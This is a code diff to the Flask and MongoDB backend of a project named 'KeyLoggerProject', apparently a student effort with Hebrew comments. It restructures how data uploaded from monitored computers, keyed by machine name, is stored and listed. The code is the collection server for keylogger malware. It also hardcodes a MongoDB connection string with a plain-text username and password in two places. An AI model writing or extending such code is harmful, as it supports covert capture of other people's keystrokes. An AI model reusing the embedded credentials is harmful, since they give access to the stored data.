@@ -1,5 +1,3 @@
-from crypt import methods
-
 from flask import Flask,jsonify,request
 from flask_cors import CORS
 from encryptor import Encryptor
@@ -15,16 +13,27 @@ class App:
         self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
+        self.collection = self.DB["computers"]
         self.stop_tracking = "success"
 
 
     def add_computer(self,data):
         #יצירת קולקשן למחשב הנוכחי
-        collection = self.DB[data["mac_name"]]
+        if self.collection.find_one({"mac_name" : data["mac_name"]}) is not None:
+            self._update_computer_data(data)
+            return
+
         #הכנסת הנתונים לקולקשן
-        inserted_id = collection.insert_one(data).inserted_id
+        data["data"] = [data["data"]]
+        inserted_id = self.collection.insert_one(data).inserted_id
         #החזרת הid של הנתונים החדשים
         return inserted_id
+
+    def _update_computer_data(self,data):
+        self.collection.update_one(
+            {"mac_name" : data["mac_name"]},
+            { "$push" :  {"data" : data["data"]}}
+        )
 
     def get_data(self,computer_name):
         #בדיקה האם הכניס שם מחשב
@@ -36,24 +45,24 @@ class App:
             return "ERROR: not found"
 
         #קבלת רשימה של כל הקבצים
-        collection = self.DB[self.computer_connection[computer_name]]
-        data = list(collection.find({},{"_id" : 0}))
-        return data
+        data = self.collection.find_one({"mac_name" : self.computer_connection[computer_name]},{"data" : 1,"_id" : 0})
+        return data.get("data",{})
 
     def get_computer_list(self):
         #קבלת רשימה של כל המחשבים
-        computer_list = self.DB.list_collection_names()
+        computer_list = self.collection.find({},{"mac_name" : 1,"_id" : 0})
+        computer_list = [computer["mac_name"] for computer in computer_list]
         #יצירת קישור בין שם מחשב לכתובת שלו
-        self.computer_connection =  {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}
+        self.computer_connection = {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}
         #החזרת הרשימה של כל שמות המחשבים
         return list(self.computer_connection.keys())
 
 class Users:
 
     def __init__(self):
-        #יצירת חיבור לmongodb
-        #יצירת קולקשן חדש למשתמשים
-        pass
+        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+        self.client = MongoClient(self.CONNECTION_STRING)
+        self.DB = self.client["UsersDatabase"]
 
     def verify_user(self,data:dict):
         #בדיקה מול המסד נתונים אם קיים המשתמש
